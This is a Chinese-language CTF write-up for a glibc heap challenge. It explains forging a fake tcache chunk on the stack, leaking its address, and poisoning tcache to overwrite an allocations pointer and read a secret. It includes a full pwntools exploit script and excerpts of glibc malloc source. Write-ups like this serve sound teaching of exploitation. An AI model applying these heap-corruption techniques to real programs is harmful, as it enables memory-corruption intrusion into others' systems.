解题思路

既然我们可以向栈上写内容，同时又可以free栈上的内存，这样我们就可以构造一个chunk，然后free掉 这样就能泄漏出栈上内存地址了。具体怎么做呢? 先来看看tcache bin里的chunk的构造：

             chunk metadata        tcache_entry
          ┌──────────────────┬──────────────────┐
          │ prev_size │ size │ next     │ key   │ ...
          └──────────────────┴──────────────────┘
          0x00        0x08   0x10       0x18
                              ↑
                           user_ptr

首先，我们malloc一个size为24大小的内存，我们将这个chunk命名为H。那么其真正的chunk_size怎么算呢？ 关键点是：prev_size 只有在“前一个 chunk 已经不再使用”时才有意义。当前一个 chunk 正在使用时， glibc 可以把“下一个 chunk 的 prev_size”借给当前 chunk 当作可用空间。

              malloc_chunk
                  ↓
        ┌──────────────────┐
+0x00   │ prev_size   8B   │
        ├──────────────────┤
+0x08   │ size=0x21   8B   │  ← 0x20 | PREV_INUSE
        ├──────────────────┤
+0x10   │                  │ ← p
        │ user data  16B   │
        │                  │
        └──────────────────┘ ← chunk_size=0x20
+0x20   │ next.prev_size   │
        │ ← 用户还能用 8B    │
        ├──────────────────┤
+0x28   │ next.size        │ ← 不能碰
        └──────────────────┘

        <------ 24B ------->
        p+0x00      ~ p+0x17

所以这个chunk的实际大小是0x20，32字节，正好16字节对齐了。这个时候我们就知道我们要在栈上构造的chunk大小应当为 0x20字节了，再把PREV_IN_USE位设为1即为0x21。从关键内存位置我们可以看到stack_free的内存块地址 与stack_scanf的内存起始地址相差0x40，这时我们用stack_free向内存写入 b"A" * 0x38 + p64(0x21)就构造出了一个size为 0x20的chunk。我们将这个chunk命名为S。注意目前我们能用来free的有两个chunk，一个是malloc(24)， 另一个是栈上构造的S。我们再将allocation[0]的地址命名为A。接下来用如下的攻击链来完成对flag的获取。

攻击链

free(S) 后：          S
free(H) 后：          H -> S
puts(H)：             泄漏 S 的栈地址

改写 H.next 为 A：   H -> A
malloc 两次：         先拿到 H，再拿到 A

A 是 allocations[0] 的地址
scanf(allocations[2], p64(secret_addr))
                     ↓
allocations[0] = secret_addr

puts(0)：             读出原始 secret
send_flag(secret)：   获得 flag

解题脚本

from pwn import *

context.arch = 'amd64'

PROMPT = b"[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): "

secret_delta = 0xe2 # 不同的二进制文件不一样。
def solve():
    p = process("/challenge/stack-summoning-easy")

    def choose(command):
        p.sendlineafter(PROMPT, command)
    
    def malloc(index, size):
        choose(b"malloc")
        p.sendlineafter(b"Index: ", str(index).encode())
        p.sendlineafter(b"Size: ", str(size).encode())
    
    def free(index):
        choose(b"free")
        p.sendlineafter(b"Index: ", str(index).encode())
    
    def scanf(index, data):
        choose(b"scanf")
        p.sendlineafter(b"Index: ", str(index).encode())
        p.sendline(data)
    
    def stack_scanf(data):
        choose(b"stack_scanf")
        p.sendline(data)
    
    def leak_with_puts(index):
        choose(b"puts")
        p.sendlineafter(b"Index: ", str(index).encode())
        p.recvuntil(b"Data: ")
        return p.recvline(drop=True)

    malloc(0, 24)

    stack_scanf(b"A"*0x38 + p64(0x21))

    choose(b"stack_free")

    free(0)

    raw_leak = leak_with_puts(0)

    if len(raw_leak) != 6:
        p.close()
        return None
    
    stack_chunk = u64(raw_leak + b"\x00\x00")
    array_base = stack_chunk - (0x210 - 0x190 + 0x40)
    secret_addr = stack_chunk - 0x40 + secret_delta

    scanf(0, p64(array_base))

    malloc(1, 24) #得到H
    malloc(2, 24) #得到A

    scanf(2, p64(secret_addr))
    secret = leak_with_puts(0)

    log.info(f"secret = {secret}")

    choose(b"send_flag")

    p.sendlineafter(b"Secret: ", secret)
    
    p.interactive()

solve()

One more thing

我们注意到，汇编代码在一开始给[rbp-0x210-0x8]赋值

00401d93  48c785e8fdfffff2…  mov     qword [rbp-0x218 {var_220}], 0x2f2

背后的原因是，程序调用scanf函数之前，会先调用malloc_usable_size()判断这个chunk的大小

00402224  488b84c5f0fdffff   mov     rax, qword [rbp+rax*8-0x210 {var_218}]
0040222c  4889c7             mov     rdi, rax
0040222f  b800000000         mov     eax, 0x0
00402234  e857f0ffff         call    malloc_usable_size

当我们向allocation[0]写入的时候，scanf以为我们是向某个chunk写入数据，所以会检查allocation - 8 即chunk的size字段。

本题相关的 glibc 2.31 源码在 malloc/malloc.c。 核心实现是：

static size_t
musable (void *mem)
{
  mchunkptr p;

  if (mem != 0)
    {
      p = mem2chunk(mem);

      if (chunk_is_mmapped(p))
        {
          if (DUMPED_MAIN_ARENA_CHUNK(p))
            return chunksize(p) - SIZE_SZ;
          else
            return chunksize(p) - 2 * SIZE_SZ;
        }
      else if (inuse(p))
        return chunksize(p) - SIZE_SZ;
    }

  return 0;
}

size_t
__malloc_usable_size(void *m)
{
  return musable(m);
}

配套宏也很关键：

#define chunk2mem(p)   ((void *)((char *)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char *)(mem) - 2*SIZE_SZ))

#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
#define chunksize(p) (p->mchunk_size & ~SIZE_BITS)

在 x86-64 上，SIZE_SZ == 8。因此：

mem = array_base
p   = mem2chunk(mem) = array_base - 0x10
p->mchunk_size       = array_base - 0x08 字段的值

题目在那里放的是： 0x2f2 = 0x2f0 | 0x2 所以： chunksize(p) = 0x2f2 & ~0x7 = 0x2f0 其中 0x2 位是 IS_MMAPPED。它让代码进入第一个分支，直接返回： 0x2f0 - 2 * 8 = 0x2e0 也就是说： malloc_usable_size(array_base) == 0x2e0 这正是题目需要 0x2f2 而不只是随便放一个大数的原因：它既伪造了大 chunk 大小，又设置了 IS_MMAPPED，避免走 inuse(p) 分支去读取伪造 chunk 后方的“下一个 chunk”元数据。
